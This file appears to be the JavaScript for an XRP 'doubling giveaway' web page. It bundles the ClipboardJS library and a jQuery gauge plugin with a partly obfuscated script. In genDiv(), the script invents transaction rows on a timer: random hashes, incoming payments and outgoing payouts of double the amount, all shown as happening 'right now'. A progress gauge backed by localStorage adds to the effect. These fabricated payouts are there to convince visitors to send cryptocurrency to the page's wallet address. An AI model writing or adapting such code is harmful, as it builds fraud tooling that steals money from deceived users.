! function(t, e) { "object" == typeof exports && "object" == typeof module ? module.exports = e() : "function" == typeof define && define.amd ? define([], e) : "object" == typeof exports ? exports.ClipboardJS = e() : t.ClipboardJS = e() }(this, function() { return function(n) { var o = {};

    function r(t) { if (o[t]) return o[t].exports; var e = o[t] = { i: t, l: !1, exports: {} }; return n[t].call(e.exports, e, e.exports, r), e.l = !0, e.exports } return r.m = n, r.c = o, r.d = function(t, e, n) { r.o(t, e) || Object.defineProperty(t, e, { enumerable: !0, get: n }) }, r.r = function(t) { "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(t, "__esModule", { value: !0 }) }, r.t = function(e, t) { if (1 & t && (e = r(e)), 8 & t) return e; if (4 & t && "object" == typeof e && e && e.__esModule) return e; var n = Object.create(null); if (r.r(n), Object.defineProperty(n, "default", { enumerable: !0, value: e }), 2 & t && "string" != typeof e)
        for (var o in e) r.d(n, o, function(t) { return e[t] }.bind(null, o)); return n }, r.n = function(t) { var e = t && t.__esModule ? function() { return t.default } : function() { return t }; return r.d(e, "a", e), e }, r.o = function(t, e) { return Object.prototype.hasOwnProperty.call(t, e) }, r.p = "", r(r.s = 0) }([function(t, e, n) { "use strict"; var r = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) { return typeof t } : function(t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t },
    i = function() {
        function o(t, e) { for (var n = 0; n < e.length; n++) { var o = e[n];
            o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(t, o.key, o) } } return function(t, e, n) { return e && o(t.prototype, e), n && o(t, n), t } }(),
    a = o(n(1)),
    c = o(n(3)),
    u = o(n(4));

    function o(t) { return t && t.__esModule ? t : { default: t } } var l = function(t) {
        function o(t, e) {! function(t, e) { if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") }(this, o); var n = function(t, e) { if (!t) throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); return !e || "object" != typeof e && "function" != typeof e ? t : e }(this, (o.__proto__ || Object.getPrototypeOf(o)).call(this)); return n.resolveOptions(e), n.listenClick(t), n } return function(t, e) { if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function, not " + typeof e);
            t.prototype = Object.create(e && e.prototype, { constructor: { value: t, enumerable: !1, writable: !0, configurable: !0 } }), e && (Object.setPrototypeOf ? Object.setPrototypeOf(t, e) : t.__proto__ = e) }(o, c.default), i(o, [{ key: "resolveOptions", value: function() { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {};
                this.action = "function" == typeof t.action ? t.action : this.defaultAction, this.target = "function" == typeof t.target ? t.target : this.defaultTarget, this.text = "function" == typeof t.text ? t.text : this.defaultText, this.container = "object" === r(t.container) ? t.container : document.body } }, { key: "listenClick", value: function(t) { var e = this;
                this.listener = (0, u.default)(t, "click", function(t) { return e.onClick(t) }) } }, { key: "onClick", value: function(t) { var e = t.delegateTarget || t.currentTarget;
                this.clipboardAction && (this.clipboardAction = null), this.clipboardAction = new a.default({ action: this.action(e), target: this.target(e), text: this.text(e), container: this.container, trigger: e, emitter: this }) } }, { key: "defaultAction", value: function(t) { return s("action", t) } }, { key: "defaultTarget", value: function(t) { var e = s("target", t); if (e) return document.querySelector(e) } }, { key: "defaultText", value: function(t) { return s("text", t) } }, { key: "destroy", value: function() { this.listener.destroy(), this.clipboardAction && (this.clipboardAction.destroy(), this.clipboardAction = null) } }], [{ key: "isSupported", value: function() { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : ["copy", "cut"],
                e = "string" == typeof t ? [t] : t,
                n = !!document.queryCommandSupported; return e.forEach(function(t) { n = n && !!document.queryCommandSupported(t) }), n } }]), o }();

    function s(t, e) { var n = "data-clipboard-" + t; if (e.hasAttribute(n)) return e.getAttribute(n) }
    t.exports = l }, function(t, e, n) { "use strict"; var o, r = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(t) { return typeof t } : function(t) { return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t },
    i = function() {
        function o(t, e) { for (var n = 0; n < e.length; n++) { var o = e[n];
            o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(t, o.key, o) } } return function(t, e, n) { return e && o(t.prototype, e), n && o(t, n), t } }(),
    a = n(2),
    c = (o = a) && o.__esModule ? o : { default: o }; var u = function() {
    function e(t) {! function(t, e) { if (!(t instanceof e)) throw new TypeError("Cannot call a class as a function") }(this, e), this.resolveOptions(t), this.initSelection() } return i(e, [{ key: "resolveOptions", value: function() { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : {};
            this.action = t.action, this.container = t.container, this.emitter = t.emitter, this.target = t.target, this.text = t.text, this.trigger = t.trigger, this.selectedText = "" } }, { key: "initSelection", value: function() { this.text ? this.selectFake() : this.target && this.selectTarget() } }, { key: "selectFake", value: function() { var t = this,
            e = "rtl" == document.documentElement.getAttribute("dir");
            this.removeFake(), this.fakeHandlerCallback = function() { return t.removeFake() }, this.fakeHandler = this.container.addEventListener("click", this.fakeHandlerCallback) || !0, this.fakeElem = document.createElement("textarea"), this.fakeElem.style.fontSize = "12pt", this.fakeElem.style.border = "0", this.fakeElem.style.padding = "0", this.fakeElem.style.margin = "0", this.fakeElem.style.position = "absolute", this.fakeElem.style[e ? "right" : "left"] = "-9999px"; var n = window.pageYOffset || document.documentElement.scrollTop;
            this.fakeElem.style.top = n + "px", this.fakeElem.setAttribute("readonly", ""), this.fakeElem.value = this.text, this.container.appendChild(this.fakeElem), this.selectedText = (0, c.default)(this.fakeElem), this.copyText() } }, { key: "removeFake", value: function() { this.fakeHandler && (this.container.removeEventListener("click", this.fakeHandlerCallback), this.fakeHandler = null, this.fakeHandlerCallback = null), this.fakeElem && (this.container.removeChild(this.fakeElem), this.fakeElem = null) } }, { key: "selectTarget", value: function() { this.selectedText = (0, c.default)(this.target), this.copyText() } }, { key: "copyText", value: function() { var e = void 0; try { e = document.execCommand(this.action) } catch (t) { e = !1 }
            this.handleResult(e) } }, { key: "handleResult", value: function(t) { this.emitter.emit(t ? "success" : "error", { action: this.action, text: this.selectedText, trigger: this.trigger, clearSelection: this.clearSelection.bind(this) }) } }, { key: "clearSelection", value: function() { this.trigger && this.trigger.focus(), window.getSelection().removeAllRanges() } }, { key: "destroy", value: function() { this.removeFake() } }, { key: "action", set: function() { var t = 0 < arguments.length && void 0 !== arguments[0] ? arguments[0] : "copy"; if (this._action = t, "copy" !== this._action && "cut" !== this._action) throw new Error('Invalid "action" value, use either "copy" or "cut"') }, get: function() { return this._action } }, { key: "target", set: function(t) { if (void 0 !== t) { if (!t || "object" !== (void 0 === t ? "undefined" : r(t)) || 1 !== t.nodeType) throw new Error('Invalid "target" value, use a valid Element'); if ("copy" === this.action && t.hasAttribute("disabled")) throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute'); if ("cut" === this.action && (t.hasAttribute("readonly") || t.hasAttribute("disabled"))) throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
            this._target = t } }, get: function() { return this._target } }]), e }();
    t.exports = u }, function(t, e) { t.exports = function(t) { var e; if ("SELECT" === t.nodeName) t.focus(), e = t.value;
else if ("INPUT" === t.nodeName || "TEXTAREA" === t.nodeName) { var n = t.hasAttribute("readonly");
    n || t.setAttribute("readonly", ""), t.select(), t.setSelectionRange(0, t.value.length), n || t.removeAttribute("readonly"), e = t.value } else { t.hasAttribute("contenteditable") && t.focus(); var o = window.getSelection(),
    r = document.createRange();
    r.selectNodeContents(t), o.removeAllRanges(), o.addRange(r), e = o.toString() } return e } }, function(t, e) {
    function n() {}
    n.prototype = { on: function(t, e, n) { var o = this.e || (this.e = {}); return (o[t] || (o[t] = [])).push({ fn: e, ctx: n }), this }, once: function(t, e, n) { var o = this;

            function r() { o.off(t, r), e.apply(n, arguments) } return r._ = e, this.on(t, r, n) }, emit: function(t) { for (var e = [].slice.call(arguments, 1), n = ((this.e || (this.e = {}))[t] || []).slice(), o = 0, r = n.length; o < r; o++) n[o].fn.apply(n[o].ctx, e); return this }, off: function(t, e) { var n = this.e || (this.e = {}),
            o = n[t],
            r = []; if (o && e)
            for (var i = 0, a = o.length; i < a; i++) o[i].fn !== e && o[i].fn._ !== e && r.push(o[i]); return r.length ? n[t] = r : delete n[t], this } }, t.exports = n }, function(t, e, n) { var d = n(5),
    h = n(6);
    t.exports = function(t, e, n) { if (!t && !e && !n) throw new Error("Missing required arguments"); if (!d.string(e)) throw new TypeError("Second argument must be a String"); if (!d.fn(n)) throw new TypeError("Third argument must be a Function"); if (d.node(t)) return s = e, f = n, (l = t).addEventListener(s, f), { destroy: function() { l.removeEventListener(s, f) } }; if (d.nodeList(t)) return a = t, c = e, u = n, Array.prototype.forEach.call(a, function(t) { t.addEventListener(c, u) }), { destroy: function() { Array.prototype.forEach.call(a, function(t) { t.removeEventListener(c, u) }) } }; if (d.string(t)) return o = t, r = e, i = n, h(document.body, o, r, i); throw new TypeError("First argument must be a String, HTMLElement, HTMLCollection, or NodeList"); var o, r, i, a, c, u, l, s, f } }, function(t, n) { n.node = function(t) { return void 0 !== t && t instanceof HTMLElement && 1 === t.nodeType }, n.nodeList = function(t) { var e = Object.prototype.toString.call(t); return void 0 !== t && ("[object NodeList]" === e || "[object HTMLCollection]" === e) && "length" in t && (0 === t.length || n.node(t[0])) }, n.string = function(t) { return "string" == typeof t || t instanceof String }, n.fn = function(t) { return "[object Function]" === Object.prototype.toString.call(t) } }, function(t, e, n) { var a = n(7);

    function i(t, e, n, o, r) { var i = function(e, n, t, o) { return function(t) { t.delegateTarget = a(t.target, n), t.delegateTarget && o.call(e, t) } }.apply(this, arguments); return t.addEventListener(n, i, r), { destroy: function() { t.removeEventListener(n, i, r) } } }
    t.exports = function(t, e, n, o, r) { return "function" == typeof t.addEventListener ? i.apply(null, arguments) : "function" == typeof n ? i.bind(null, document).apply(null, arguments) : ("string" == typeof t && (t = document.querySelectorAll(t)), Array.prototype.map.call(t, function(t) { return i(t, e, n, o, r) })) } }, function(t, e) { if ("undefined" != typeof Element && !Element.prototype.matches) { var n = Element.prototype;
    n.matches = n.matchesSelector || n.mozMatchesSelector || n.msMatchesSelector || n.oMatchesSelector || n.webkitMatchesSelector }
    t.exports = function(t, e) { for (; t && 9 !== t.nodeType;) { if ("function" == typeof t.matches && t.matches(e)) return t;
        t = t.parentNode } } }]) });

// script start

! function (e) {
    e.fn.gaugeMeter = function (t) {
        var a = e.extend({
            id: "",
            percent: 0,
            used: 0,
            total: 100,
            size: 100,
            prepend: "",
            append: "",
            theme: "Black",
            color: "",
            back: "RGBa(63,69,95,1)",
            width: 3,
            style: "Full",
            stripe: "0",
            animationstep: 1,
            animate_gauge_colors: "0",
            animate_text_colors: "0",
            label: "",
            label_color: "Black"
        }, t);
        return this.each(function () {
            function t(e) {
                var t = "#2C94E0";
                return e || (e = 1e-14), "Red-Gold-Green" == l.theme && (e > 0 && (t = "#d90000"), e > 10 && (t = "#e32100"), e > 20 && (t = "#f35100"), e > 30 && (t = "#ff8700"), e > 40 && (t = "#ffb800"), e > 50 && (t = "#ffd900"), e > 60 && (t = "#dcd800"), e > 70 && (t = "#a6d900"), e > 80 && (t = "#69d900"), e > 90 && (t = "#32d900")), "Green-Gold-Red" == l.theme && (e > 0 && (t = "#32d900"), e > 10 && (t = "#69d900"), e > 20 && (t = "#a6d900"), e > 30 && (t = "#dcd800"), e > 40 && (t = "#ffd900"), e > 50 && (t = "#ffb800"), e > 60 && (t = "#ff8700"), e > 70 && (t = "#f35100"), e > 80 && (t = "#e32100"), e > 90 && (t = "#d90000")), "Green-Red" == l.theme && (e > 0 && (t = "#32d900"), e > 10 && (t = "#41c900"), e > 20 && (t = "#56b300"), e > 30 && (t = "#6f9900"), e > 40 && (t = "#8a7b00"), e > 50 && (t = "#a75e00"), e > 60 && (t = "#c24000"), e > 70 && (t = "#db2600"), e > 80 && (t = "#f01000"), e > 90 && (t = "#ff0000")), "Red-Green" == l.theme && (e > 0 && (t = "#ff0000"), e > 10 && (t = "#f01000"), e > 20 && (t = "#db2600"), e > 30 && (t = "#c24000"), e > 40 && (t = "#a75e00"), e > 50 && (t = "#8a7b00"), e > 60 && (t = "#6f9900"), e > 70 && (t = "#56b300"), e > 80 && (t = "#41c900"), e > 90 && (t = "#32d900")), "DarkBlue-LightBlue" == l.theme && (e > 0 && (t = "#2c94e0"), e > 10 && (t = "#2b96e1"), e > 20 && (t = "#2b99e4"), e > 30 && (t = "#2a9ce7"), e > 40 && (t = "#28a0e9"), e > 50 && (t = "#26a4ed"), e > 60 && (t = "#25a8f0"), e > 70 && (t = "#24acf3"), e > 80 && (t = "#23aff5"), e > 90 && (t = "#21b2f7")), "LightBlue-DarkBlue" == l.theme && (e > 0 && (t = "#21b2f7"), e > 10 && (t = "#23aff5"), e > 20 && (t = "#24acf3"), e > 30 && (t = "#25a8f0"), e > 40 && (t = "#26a4ed"), e > 50 && (t = "#28a0e9"), e > 60 && (t = "#2a9ce7"), e > 70 && (t = "#2b99e4"), e > 80 && (t = "#2b96e1"), e > 90 && (t = "#2c94e0")), "DarkRed-LightRed" == l.theme && (e > 0 && (t = "#d90000"), e > 10 && (t = "#dc0000"), e > 20 && (t = "#e00000"), e > 30 && (t = "#e40000"), e > 40 && (t = "#ea0000"), e > 50 && (t = "#ee0000"), e > 60 && (t = "#f30000"), e > 70 && (t = "#f90000"), e > 80 && (t = "#fc0000"), e > 90 && (t = "#ff0000")), "LightRed-DarkRed" == l.theme && (e > 0 && (t = "#ff0000"), e > 10 && (t = "#fc0000"), e > 20 && (t = "#f90000"), e > 30 && (t = "#f30000"), e > 40 && (t = "#ee0000"), e > 50 && (t = "#ea0000"), e > 60 && (t = "#e40000"), e > 70 && (t = "#e00000"), e > 80 && (t = "#dc0000"), e > 90 && (t = "#d90000")), "DarkGreen-LightGreen" == l.theme && (e > 0 && (t = "#32d900"), e > 10 && (t = "#33db00"), e > 20 && (t = "#34df00"), e > 30 && (t = "#34e200"), e > 40 && (t = "#36e700"), e > 50 && (t = "#37ec00"), e > 60 && (t = "#38f100"), e > 70 && (t = "#38f600"), e > 80 && (t = "#39f900"), e > 90 && (t = "#3afc00")), "LightGreen-DarkGreen" == l.theme && (e > 0 && (t = "#3afc00"), e > 10 && (t = "#39f900"), e > 20 && (t = "#38f600"), e > 30 && (t = "#38f100"), e > 40 && (t = "#37ec00"), e > 50 && (t = "#36e700"), e > 60 && (t = "#34e200"), e > 70 && (t = "#34df00"), e > 80 && (t = "#33db00"), e > 90 && (t = "#32d900")), "DarkGold-LightGold" == l.theme && (e > 0 && (t = "#ffb800"), e > 10 && (t = "#ffba00"), e > 20 && (t = "#ffbd00"), e > 30 && (t = "#ffc200"), e > 40 && (t = "#ffc600"), e > 50 && (t = "#ffcb00"), e > 60 && (t = "#ffcf00"), e > 70 && (t = "#ffd400"), e > 80 && (t = "#ffd600"), e > 90 && (t = "#ffd900")), "LightGold-DarkGold" == l.theme && (e > 0 && (t = "#ffd900"), e > 10 && (t = "#ffd600"), e > 20 && (t = "#ffd400"), e > 30 && (t = "#ffcf00"), e > 40 && (t = "#ffcb00"), e > 50 && (t = "#ffc600"), e > 60 && (t = "#ffc200"), e > 70 && (t = "#ffbd00"), e > 80 && (t = "#ffba00"), e > 90 && (t = "#ffb800")), "White" == l.theme && (t = "#fff"), "Black" == l.theme && (t = "#62CBC0"), t
            }

            function d(t, a) {
                e("<b></b>").appendTo(t).html(label).css({
                    "font-size": a + "px",
                    "line-height": l.size + 5 * a + "px",
                    color: l.label_color
                })
            }

            function i(t) {
                var a = "";
                if ("1" == l.animate_text_colors) var a = l.fgcolor;
                e("<span></span>").appendTo(t).html(r).css({
                    "line-height": l.size + "px",
                    "font-size": .0 * l.size + "px",
                    color: a
                })
            }

            function f(t) {
                e.each(o, function (d, i) {
                    l[i] = void 0 != t.data(i) ? t.data(i) : e(a).attr(i), "fill" == i && void 0 != t.data("fill") && (s = !0)
                })
            }

            function n(a) {
                if ("1" == l.animate_gauge_colors || "1" == l.animate_text_colors) var d = t(M);
                "1" == l.animate_gauge_colors && (l.fgcolor = d, "1" == l.animate_text_colors && e("SPAN", "#" + l.id).html("<s>" + l.prepend + "</s>" + Math.floor(M).toString() + "<u>" + l.append + "</u>").css({
                    color: d
                })), g.clearRect(0, 0, b.width, b.height), g.beginPath(), g.arc(m, v, x, G, k, !1), g.strokeStyle = l.back, l.stripe > parseInt(0) ? g.setLineDash([l.stripe], 1) : g.lineCap = "round", g.stroke(), s && (g.fillStyle = l.fill, g.fill()), g.beginPath(), g.arc(m, v, x, -I, P * a - I, !1), g.lineWidth = l.width < 1 || isNaN(l.width) ? l.size / 20 : l.width, g.strokeStyle = l.fgcolor, g.stroke(), c > M && (M += z, requestAnimationFrame(function () {
                    n(Math.min(M, c) / 100)
                }, p))
            }
            e(this).attr("data-id", e(this).attr("id"));
            var r, o = ["id", "percent", "used", "total", "size", "prepend", "append", "theme", "color", "back", "width", "style", "stripe", "animationstep", "animate_gauge_colors", "animate_text_colors", "label", "label_color"],
                l = {},
                c = 0,
                p = e(this),
                s = !1;
            p.addClass("gaugeMeter"), f(p);
            var h = parseInt(l.percent);
            if (l.fgcolor = t(h), l.color && (l.fgcolor = l.color), void 0 != p.data("text") ? (r = void 0 != p.data("append") || "" != p.data("append") && null != p.data("append") ? p.data("text").toString() + "<u>" + p.data("append") + "</u>" : p.data("text"), (void 0 != p.data("prepend") || "" != p.data("prepend") && null != p.data("prepend")) && (r = "<s>" + p.data("prepend") + "</s>" + r.toString()), i(p)) : (void 0 != p.data("prepend") || "" != p.data("prepend") && null != p.data("prepend") ? (r = "<s>" + p.data("prepend") + "</s>" + p.data("percent").toString(), (void 0 != p.data("append") || "" != p.data("append") && null != p.data("append")) && (r = r.toString() + "<u>" + p.data("append") + "</u>")) : (r = p.data("percent"), (void 0 != p.data("append") || "" != p.data("append") && null != p.data("append")) && (r = r.toString() + "<u>" + p.data("append") + "</u>")), i(p)), void 0 != e(this).data("total") && void 0 != e(this).data("used")) {
                var u = e(this).data("total") / 100;
                percent = (e(this).data("used") / u / 100).toFixed(3), c = (e(this).data("used") / u).toFixed(3)
            } else void 0 != e(this).data("percent") ? (percent = e(this).data("percent") / 100, c = e(this).data("percent")) : percent = a.percent / 100;
            void 0 != e(this).data("label") && (label = e(this).data("label"), void 0 != e(this).data("style") ? d(p, l.size / 13) : d(p, l.size / 13)), e(this).width(l.size + "px");
            var b = e("<canvas></canvas>").attr({
                    width: l.size,
                    height: l.size
                }).appendTo(e(this)).get(0),
                g = b.getContext("2d"),
                m = b.width / 2,
                v = b.height / 2,
                _ = 360 * l.percent,
                x = (_ * (Math.PI / 180), b.width / 2.14),
                k = 2.3 * Math.PI,
                G = 0,
                M = 0 === l.animationstep ? c : 0,
                z = Math.max(l.animationstep, 0),
                P = 2 * Math.PI,
                I = Math.PI / 2,
                R = "";
            if (void 0 != e(this).data("style")) {
                if (R = e(this).data("style"), "Semi" == R) var k = 2 * Math.PI,
                    G = 3.13,
                    P = 1 * Math.PI,
                    I = Math.PI / .996;
                if ("Arch" == R) var k = 2.195 * Math.PI,
                    G = 1,
                    G = 655.99999,
                    P = 1.4 * Math.PI,
                    I = Math.PI / .8335
            }
            n(M / 100)
        })
    }
}(jQuery);


function CopyToClipboard(id) {
    var r = document.createRange();
    r.selectNode(document.getElementById(id));
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(r);
    document.execCommand('copy');
    window.getSelection().removeAllRanges();
}

$(document).ready(function () {
    $("#nav-mb").on("click", "a", function (event) {
        event.preventDefault();
        var id = $(this).attr('href'),
            top = $(id).offset().top;
        $('body,html').animate({
            scrollTop: top
        }, 1500);
    });
});
// 

$(document).ready(function () {
    $(".Gaugemeter").gaugeMeter();
});

var btns = document.querySelectorAll('button');
var clipboard = new ClipboardJS(btns);
clipboard.on('success', function (e) {
    console.log(e);
});
clipboard.on('error', function (e) {
    console.log(e);
});

function randomString(_0xe480x2) {
    var _0xe480x3 = 'rp';
    var _0xe480x4 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var _0xe480x5 = _0xe480x4['length'];
    for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
        _0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
    };
    return _0xe480x3
}

function randomStringHashBTC(_0xe480x2) {
    var _0xe480x3 = '';
    var _0xe480x4 = 'bacfed0123456789';
    var _0xe480x5 = _0xe480x4['length'];
    for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
        _0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
    };
    return _0xe480x3
}

var divCounter = 0;

function randomInteger(min, max) {
    let rand = min + Math.random() * (max - min);
    return Math.round(rand);
}

function randomIntegerBTC(min, max) {
    let rand = min + Math.random() * (max - min);
    return rand.toFixed(2);
}

function getRundomMnogitel() {
    let asd = [1, 0.1, 0.01];
    let getRandom = Math.floor(Math.random() * asd.length);
    return asd[getRandom];
}

function genDiv() {
    divCounter++;
    let valet = document.getElementById("walletaddress").innerText;
    var _0xe480x9 =
        `${'<div class="item"><div class="top"><div class="data"><div class="data-item">{t1}</div><div class="data-item">{t2}</div><div class="data-item" id="btcstr">{t4}</div><div class="data-item">{t5}</div><div class="data-item">{t6}</div><div class="data-item">{t3}</div><div class="data-item">{t7}</div><div class="data-item">{t8}</div></div></div><div class="bottom"><div class="data"><div class="data-item">{b1}</div><div class="data-item">{b2}</div><div class="data-item">{b4}</div><div class="data-item">{b5}</div><div class="data-item" id="btcstr">{b6}</div><div class="data-item">{b3}</div><div class="data-item">{b7}</div><div class="data-item">{b8}</div></div></div></div>'}`;
    let _0xe480xa = randomStringHashBTC(10) + '...';
    let _0xe480xb = "616" + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9);
    let _0xe480xc = 'right now';
    let _0xe480xd = '' + randomString(9) + '...';
    let _0xe480xe = 'IN';
    let _0xe480xf = valet.substring(0, 10);
    let valueSend = randomIntegerBTC(minSend, maxSend);
    let _0xe480x10 = valueSend + ' XRP';
    let _0xe480x11 = ((Math['random']() * 0.09 * getRundomMnogitel()) + 0.001 * getRundomMnogitel())[
        'toFixed'](5);
    let _0xe480x12 = randomStringHashBTC(10) + '...';
    let _0xe480x13 = "616" + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9);
    let _0xe480x14 = 'right now';
    let _0xe480x15 = _0xe480xf.slice(0, 10) + "...";
    let _0xe480x16 = 'OUT';
    let _0xe480x17 = _0xe480xd;
    let _0xe480x18 = (valueSend * 2) + ' XRP';
    let _0xe480x19 = ((Math['random']() * 0.09 * getRundomMnogitel()) + 0.001 * getRundomMnogitel())[
        'toFixed'](5);
    _0xe480x9 = _0xe480x9['replace']('{t1}', _0xe480x12);
    _0xe480x9 = _0xe480x9['replace']('{t2}', _0xe480x13);
    _0xe480x9 = _0xe480x9['replace']('{t3}', _0xe480x14);
    _0xe480x9 = _0xe480x9['replace']('{t4}', _0xe480x15);
    _0xe480x9 = _0xe480x9['replace']('{t5}', _0xe480x16);
    _0xe480x9 = _0xe480x9['replace']('{t6}', _0xe480x17);
    _0xe480x9 = _0xe480x9['replace']('{t7}', _0xe480x18);
    _0xe480x9 = _0xe480x9['replace']('{t8}', _0xe480x19);
    _0xe480x9 = _0xe480x9['replace']('{b1}', _0xe480xa);
    _0xe480x9 = _0xe480x9['replace']('{b2}', _0xe480xb);
    _0xe480x9 = _0xe480x9['replace']('{b3}', _0xe480xc);
    _0xe480x9 = _0xe480x9['replace']('{b4}', _0xe480xd);
    _0xe480x9 = _0xe480x9['replace']('{b5}', _0xe480xe);
    _0xe480x9 = _0xe480x9['replace']('{b6}', _0xe480x15);
    _0xe480x9 = _0xe480x9['replace']('{b7}', _0xe480x10);
    _0xe480x9 = _0xe480x9['replace']('{b8}', _0xe480x11);
    var _0xe480x1a = $(_0xe480x9)['prependTo']('.table-body');
    $('.item')['each'](function () {
        var _0xe480x6 = $(this)['index']();
        if (_0xe480x6 > 0) {
            $(this)['find']('.top .data div')['eq'](5)['html'](_0xe480x6 + ' min');
            $(this)['find']('.bottom .data div')['eq'](5)['html'](_0xe480x6 + ' min')
        }
    });
	
	
	var send = Math.round(valueSend * 2);
	console.log(send);
    currentCount = eval(currentCount) + eval(send); 
	console.log(currentCount);
	
	if(localStorage.getItem("barXRP")){
		if(localStorage.getItem("barXRP") >= MinClearToReal){
			 console.log(".1");
			localStorage.setItem("barXRP", currentCountREAL);
			currentCount = currentCountREAL; 
			
		} else if(localStorage.getItem("barXRP")) {
			 console.log(".2");
			 localStorage.setItem("barXRP", currentCount);
			
        }
	} else {
		 console.log(".3");
        localStorage.setItem("barXRP", currentCountREAL);
    }
	
	
	let titleCount = document.getElementById("titlecount").innerText = count.toLocaleString('ru');
	let countLoad = document.getElementById("countload").innerText = count.toLocaleString('ru');
	let countCurrent = document.getElementById("countcurrent").innerText = currentCount.toLocaleString('ru');
	let titleWallet = document.getElementById("wallet").innerText = wallet.toLocaleString('ru');
	let adressWaller = document.getElementById("walletaddress").innerText = wallet.toLocaleString('ru');
	let percentCount = currentCount * 100 / count;
	let cicrele = document.getElementById("GaugeMeter_1").setAttribute('data-percent', percentCount);
	
	
	
    setTimeout(function () {
        _0xe480x1a['find']('.top')['fadeIn']();
        _0xe480x1a['find']('.bottom .data div')['eq'](5)['html']('right now')
    }, 2000)
}

$(document)['ready'](function () {
    genDiv();
    setInterval(function () {
        genDiv()
    }, 12500)
})